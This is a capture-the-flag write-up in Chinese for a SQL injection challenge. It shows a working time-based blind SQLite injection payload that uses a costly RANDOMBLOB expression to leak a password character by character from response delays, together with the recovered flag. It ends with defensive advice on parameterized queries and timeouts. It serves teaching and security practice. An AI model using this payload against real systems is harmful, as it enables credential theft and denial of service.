# SQLi Trainer 3

## 题目简述

第三版登录接口不仅固定返回失败，还主动丢弃 `fetchall()` 的结果。flag 仍存放在 SQLite 密码字段中，用户输入也仍被拼接进查询。目标是在完全没有内容型反馈的情况下继续利用执行时间恢复数据。

## 解题过程

服务端执行：

```python
cursor.execute(query).fetchall()
return [], "Login failed!"
```

丢弃查询结果不会阻止数据库计算 `WHERE` 条件，因此与上一题相同的条件延迟仍然有效。构造：

```sql
' OR (
  pass LIKE '<known-prefix><guess>%'
  AND 100=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(400000000/2))))
);--
```

逐个候选字符测量请求耗时；只有当前缀正确时才会执行昂贵的 `RANDOMBLOB` 表达式。核心循环与第二题一致，直到恢复右花括号为止，结果为：

```text
grey{00p5_5l33p_15_v3ry_1mp0r74n7}
```

本题比第二题更明确地说明：攻击者不需要查询结果进入应用逻辑，只需要数据库执行可控表达式并产生外部可测差异。

## 方法总结

“不使用查询结果”不是 SQL 注入修复。只要恶意 SQL 被解析执行，就可能造成延时、资源消耗或副作用。根本措施仍是参数化查询，并配合请求超时、资源限制和异常监控降低侧信道与拒绝服务风险。
